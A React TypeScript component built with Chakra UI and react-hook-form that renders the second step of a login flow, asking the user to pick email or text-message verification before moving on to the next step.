import {
  Box,
  Button,
  FormControl,
  FormLabel,
  Input,
  Select,
  Text,
  VStack,
} from "@chakra-ui/react";
import { useState } from "react";
import { useForm, SubmitHandler } from "react-hook-form";
import { useNavigate } from "react-router-dom";

type Inputs = {
  verifyMethod: string;
};

const Form2 = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm<Inputs>();
  const [data, setData] = useState({ verifyMethod: "" });
  const onSubmit: SubmitHandler<Inputs> = (data) => {
    setData(() => data);

    if (data.verifyMethod === "") {
      return;
    }

    navigate("/login/3");
  };

  return (
    <VStack
      spacing="6"
      w={{ base: "100%", md: "50%" }}
      marginLeft={{ base: "unset", md: "25%" }}
      bg="#1c70c8"
      p="4"
      color="#fff"
    >
      <Text
        fontFamily="Poppins"
        fontSize="lg"
        fontWeight="bold"
        textAlign="left"
      >
        Account Verification!
      </Text>
      <Text fontFamily="Poppins" fontSize="sm" textAlign="left">
        For your security we need to verify your identity to complete this
        action. Please select verification method.
      </Text>
      <Box
        w="90%"
        display="flex"
        flexDirection="column"
        justifyContent="space-between"
      >
        <form onSubmit={handleSubmit(onSubmit)}>
          <FormControl mb="2">
            <FormLabel>Select verification method:</FormLabel>
            <Select placeholder="Choose One" {...register("verifyMethod")}>
              <option value="Send code to email" style={{ color: "black" }}>
                Send code to email
              </option>
              <option value="Text code to mobile" style={{ color: "black" }}>
                Text code to mobile
              </option>
            </Select>

            {errors.verifyMethod && (
              <Text fontSize="xs" color="red">
                Method is required
              </Text>
            )}
          </FormControl>

          <Box
            display="flex"
            justifyContent="center"
            alignItems="center"
            mt="8"
          >
            <Button
              fontSize="md"
              minW="150px"
              type="submit"
              mx="4"
              bg="orange"
              color="#fff"
              _hover={{ bg: "orange", opacity: "0.8", color: "#fff" }}
            >
              Continue
            </Button>
          </Box>
        </form>
      </Box>
    </VStack>
  );
};

export default Form2;
